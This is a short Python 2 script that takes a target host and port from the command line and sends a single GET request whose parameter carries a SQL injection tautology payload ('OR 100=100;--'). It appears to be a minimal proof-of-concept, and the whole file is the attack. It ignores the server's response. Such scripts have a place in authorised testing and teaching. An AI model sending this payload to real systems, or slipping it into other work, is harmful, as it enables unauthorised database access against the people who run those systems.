from requests import Request, Session
import sys


if (len(sys.argv)<3):
	print "Usage: %s <host> <port> " % sys.argv[0]
	print "Example: %s 10.10.10.10 80" % sys.argv[0]
	exit(0)

url = "http://%s:%s/?param=100\" OR 100=100;--" % (sys.argv[1], sys.argv[2])

s = Session()

req = Request('GET', url)
prepped = req.prepare()

resp = s.send(prepped)
